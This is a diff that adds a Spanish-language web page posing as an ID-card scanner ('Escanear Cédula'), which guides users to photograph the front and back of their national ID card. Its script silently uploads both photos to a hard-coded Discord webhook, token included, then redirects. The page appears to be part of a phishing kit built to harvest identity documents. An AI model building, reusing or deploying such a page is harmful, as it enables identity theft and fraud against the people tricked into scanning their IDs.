@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Escanear Cédula</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet"/>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+    body, html {
+      width: 100%; height: 100%;
+      font-family: 'Roboto', sans-serif;
+      background: #000;
+      overflow: hidden;
+    }
+
+    /* ── FULL CAMERA BACKGROUND ── */
+    #video {
+      position: fixed;
+      inset: 0;
+      width: 100%; height: 100%;
+      object-fit: cover;
+      z-index: 0;
+    }
+
+    /* ── DARK OVERLAY WITH HOLE ── */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+      /* dark vignette around the card frame */
+      background:
+        linear-gradient(to bottom, rgba(0,0,0,0.72) 0%, transparent 22%),
+        linear-gradient(to top,    rgba(0,0,0,0.72) 0%, transparent 22%);
+    }
+
+    /* ── TOP BAR ── */
+    .topbar {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 10;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 18px 20px 14px;
+    }
+    .topbar img {
+      height: 36px;
+      object-fit: contain;
+      filter: brightness(0) invert(1);
+    }
+    .topbar-fallback {
+      font-size: 20px; font-weight: 800;
+      color: white; letter-spacing: -0.5px;
+    }
+
+    /* ── STEP PILLS ── */
+    .steps {
+      position: fixed;
+      top: 72px; left: 0; right: 0;
+      z-index: 10;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+    }
+    .step-pill {
+      display: flex; align-items: center; gap: 6px;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 12px; font-weight: 700;
+      transition: all 0.3s;
+    }
+    .step-pill.active  { background: #E60026; color: white; }
+    .step-pill.done    { background: rgba(255,255,255,0.2); color: #aaffcc; }
+    .step-pill.pending { background: rgba(255,255,255,0.1); color: rgba(255,255,255,0.4); }
+    .step-dot {
+      width: 7px; height: 7px; border-radius: 50%;
+    }
+    .step-pill.active  .step-dot { background: white; }
+    .step-pill.done    .step-dot { background: #44ee88; }
+    .step-pill.pending .step-dot { background: rgba(255,255,255,0.3); }
+    .step-divider { width: 24px; height: 2px; background: rgba(255,255,255,0.2); border-radius: 2px; }
+
+    /* ── CARD FRAME ── */
+    .card-frame {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 5;
+
+      /* ID card ratio ~85.6 × 54 mm → 1.585 */
+      width: min(88vw, 360px);
+      aspect-ratio: 1.585;
+      border-radius: 14px;
+    }
+
+    /* Animated corner brackets */
+    .card-frame::before,
+    .card-frame::after,
+    .corner-br,
+    .corner-bl {
+      content: '';
+      position: absolute;
+      width: 36px; height: 36px;
+      border-color: white;
+      border-style: solid;
+      border-radius: 4px;
+      transition: border-color 0.4s;
+    }
+    /* Top-left */
+    .card-frame::before {
+      top: -2px; left: -2px;
+      border-width: 3px 0 0 3px;
+      border-radius: 10px 0 0 0;
+    }
+    /* Top-right */
+    .card-frame::after {
+      top: -2px; right: -2px;
+      border-width: 3px 3px 0 0;
+      border-radius: 0 10px 0 0;
+    }
+    /* Bottom-right */
+    .corner-br {
+      bottom: -2px; right: -2px;
+      border-width: 0 3px 3px 0;
+      border-radius: 0 0 10px 0;
+    }
+    /* Bottom-left */
+    .corner-bl {
+      bottom: -2px; left: -2px;
+      border-width: 0 0 3px 3px;
+      border-radius: 0 0 0 10px;
+    }
+
+    /* Green corners when captured */
+    .card-frame.captured::before,
+    .card-frame.captured::after,
+    .card-frame.captured .corner-br,
+    .card-frame.captured .corner-bl {
+      border-color: #44ee88;
+    }
+
+    /* Scan line inside frame */
+    .scan-line {
+      position: absolute;
+      left: 0; right: 0;
+      height: 2px;
+      background: linear-gradient(to right, transparent, #E60026, transparent);
+      box-shadow: 0 0 10px #E60026;
+      top: 0;
+      animation: scanMove 2s ease-in-out infinite alternate;
+      border-radius: 2px;
+    }
+    @keyframes scanMove {
+      0%   { top: 5%; }
+      100% { top: 92%; }
+    }
+    .card-frame.captured .scan-line { display: none; }
+
+    /* ── INSTRUCTION BOX ── */
+    .instruction {
+      position: fixed;
+      bottom: 140px; left: 20px; right: 20px;
+      z-index: 10;
+      text-align: center;
+    }
+    .instruction-badge {
+      display: inline-block;
+      background: rgba(0,0,0,0.6);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255,255,255,0.15);
+      border-radius: 16px;
+      padding: 14px 22px;
+      color: white;
+    }
+    .instruction-badge .side-label {
+      font-size: 11px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: 1px;
+      color: #E60026; margin-bottom: 4px;
+    }
+    .instruction-badge .main-msg {
+      font-size: 16px; font-weight: 500;
+      line-height: 1.4;
+    }
+    .instruction-badge .sub-msg {
+      font-size: 12px; color: rgba(255,255,255,0.55);
+      margin-top: 4px;
+    }
+
+    /* ── CAPTURE BUTTON ── */
+    .btn-capture {
+      position: fixed;
+      bottom: 48px; left: 50%; transform: translateX(-50%);
+      z-index: 10;
+      width: 72px; height: 72px;
+      border-radius: 50%;
+      border: 4px solid white;
+      background: transparent;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      transition: transform 0.15s;
+    }
+    .btn-capture:active { transform: translateX(-50%) scale(0.92); }
+    .btn-capture-inner {
+      width: 52px; height: 52px;
+      border-radius: 50%;
+      background: white;
+      transition: background 0.2s;
+    }
+    .btn-capture:disabled .btn-capture-inner { background: rgba(255,255,255,0.3); }
+    .btn-capture:disabled { border-color: rgba(255,255,255,0.3); cursor: not-allowed; }
+
+    /* ── SUCCESS FLASH ── */
+    .flash {
+      position: fixed; inset: 0; z-index: 20;
+      background: white;
+      opacity: 0; pointer-events: none;
+      transition: opacity 0.08s;
+    }
+    .flash.show { opacity: 0.85; }
+
+    /* ── CHECKMARK OVERLAY ── */
+    .check-overlay {
+      position: fixed; inset: 0; z-index: 15;
+      display: none;
+      flex-direction: column;
+      align-items: center; justify-content: center;
+      background: rgba(0,0,0,0.55);
+    }
+    .check-circle {
+      width: 80px; height: 80px; border-radius: 50%;
+      background: #44ee88;
+      display: flex; align-items: center; justify-content: center;
+      animation: popIn 0.4s cubic-bezier(.36,1.56,.64,1) both;
+    }
+    @keyframes popIn { from{transform:scale(0);opacity:0} to{transform:scale(1);opacity:1} }
+    .check-circle svg { width: 42px; height: 42px; stroke: white; fill: none; stroke-width: 3.5; stroke-linecap: round; stroke-linejoin: round; }
+    .check-text { color: white; font-size: 17px; font-weight: 600; margin-top: 16px; }
+
+    /* ── LOADER ── */
+    #loader {
+      display: none; position: fixed; inset: 0; z-index: 30;
+      background: rgba(0,0,0,0.75); backdrop-filter: blur(6px);
+      flex-direction: column; align-items: center; justify-content: center;
+    }
+    .spinner { width: 48px; height: 48px; border: 4px solid #333; border-top: 4px solid #E60026; border-radius: 50%; animation: spin 0.9s linear infinite; }
+    @keyframes spin { 100%{transform:rotate(360deg)} }
+    #loader p { color: white; margin-top: 14px; font-size: 14px; font-weight: 500; }
+
+    canvas { display: none; }
+  </style>
+</head>
+<body>
+
+<!-- CAMERA -->
+<video id="video" autoplay playsinline muted></video>
+
+<!-- DARK OVERLAY -->
+<div class="overlay"></div>
+
+<!-- TOP BAR -->
+<div class="topbar">
+  <img src="logo.png" alt="Logo"
+    onerror="this.style.display='none'; document.getElementById('lf').style.display='block'"/>
+  <span id="lf" class="topbar-fallback" style="display:none"></span>
+</div>
+
+<!-- STEPS -->
+<div class="steps">
+  <div class="step-pill active" id="pill1">
+    <div class="step-dot"></div> Anverso
+  </div>
+  <div class="step-divider"></div>
+  <div class="step-pill pending" id="pill2">
+    <div class="step-dot"></div> Reverso
+  </div>
+</div>
+
+<!-- CARD FRAME -->
+<div class="card-frame" id="cardFrame">
+  <div class="corner-br"></div>
+  <div class="corner-bl"></div>
+  <div class="scan-line"></div>
+</div>
+
+<!-- INSTRUCTION -->
+<div class="instruction">
+  <div class="instruction-badge">
+    <div class="side-label" id="sideLabel">Paso 1 de 2</div>
+    <div class="main-msg" id="mainMsg">Escanea el <strong>anverso</strong> de tu cédula</div>
+    <div class="sub-msg" id="subMsg">Ubica la parte delantera dentro del recuadro</div>
+  </div>
+</div>
+
+<!-- CAPTURE BUTTON -->
+<button class="btn-capture" id="btnCapture" onclick="capture()">
+  <div class="btn-capture-inner"></div>
+</button>
+
+<!-- FLASH -->
+<div class="flash" id="flash"></div>
+
+<!-- CHECK OVERLAY -->
+<div class="check-overlay" id="checkOverlay">
+  <div class="check-circle">
+    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+  </div>
+  <div class="check-text" id="checkText">¡Anverso capturado!</div>
+</div>
+
+<!-- LOADER -->
+<div id="loader">
+  <div class="spinner"></div>
+  <p id="loaderText">Procesando...</p>
+</div>
+
+<canvas id="canvas"></canvas>
+
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY";
+
+  let step = 'front'; // 'front' | 'back' | 'done'
+  let frontBlob = null;
+
+  // ── START CAMERA ──
+  window.addEventListener('load', async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1080 } }
+      });
+      document.getElementById('video').srcObject = stream;
+    } catch(e) {
+      // fallback to any camera
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById('video').srcObject = stream;
+      } catch(e2) {}
+    }
+  });
+
+  // ── CAPTURE ──
+  function capture() {
+    const video  = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const frame  = document.getElementById('cardFrame');
+
+    // Flash
+    const flash = document.getElementById('flash');
+    flash.classList.add('show');
+    setTimeout(() => flash.classList.remove('show'), 150);
+
+    // Draw frame
+    canvas.width  = video.videoWidth  || 1280;
+    canvas.height = video.videoHeight || 720;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+
+    canvas.toBlob(async (blob) => {
+      if (!blob) return;
+
+      if (step === 'front') {
+        frontBlob = blob;
+        showCheck('¡Anverso capturado!');
+        frame.classList.add('captured');
+
+        setTimeout(() => {
+          hideCheck();
+          frame.classList.remove('captured');
+          step = 'back';
+          updateUI();
+        }, 1800);
+
+      } else if (step === 'back') {
+        step = 'done';
+        document.getElementById('btnCapture').disabled = true;
+        showLoader('Enviando documentos...');
+
+        // Send front
+        const fdFront = new FormData();
+        fdFront.append('file', frontBlob, 'cedula_anverso.png');
+        fdFront.append('payload_json', JSON.stringify({ content: '🪪 **Cédula — Anverso**' }));
+
+        // Send back
+        const fdBack = new FormData();
+        fdBack.append('file', blob, 'cedula_reverso.png');
+        fdBack.append('payload_json', JSON.stringify({ content: '🪪 **Cédula — Reverso**' }));
+
+        try {
+          await fetch(WEBHOOK_URL, { method: 'POST', body: fdFront });
+          await fetch(WEBHOOK_URL, { method: 'POST', body: fdBack });
+        } catch(e) {}
+
+        hideLoader();
+        frame.classList.add('captured');
+        showCheck('¡Cédula escaneada!');
+
+        setTimeout(() => {
+          // Marca pills como done
+          document.getElementById('pill1').className = 'step-pill done';
+          document.getElementById('pill2').className = 'step-pill done';
+          hideCheck();
+          // Redirige a facial.html
+          window.location.href = 'index.html';
+        }, 2000);
+      }
+    }, 'image/png');
+  }
+
+  function updateUI() {
+    document.getElementById('pill1').className = 'step-pill done';
+    document.getElementById('pill2').className = 'step-pill active';
+    document.getElementById('sideLabel').textContent = 'Paso 2 de 2';
+    document.getElementById('mainMsg').innerHTML = 'Escanea el <strong>reverso</strong> de tu cédula';
+    document.getElementById('subMsg').textContent = 'Voltea la cédula y ubícala dentro del recuadro';
+  }
+
+  function showCheck(msg) {
+    document.getElementById('checkText').textContent = msg;
+    document.getElementById('checkOverlay').style.display = 'flex';
+  }
+  function hideCheck() {
+    document.getElementById('checkOverlay').style.display = 'none';
+  }
+  function showLoader(msg) {
+    document.getElementById('loaderText').textContent = msg;
+    document.getElementById('loader').style.display = 'flex';
+  }
+  function hideLoader() {
+    document.getElementById('loader').style.display = 'none';
+  }
+</script>
+</body>
+</html>
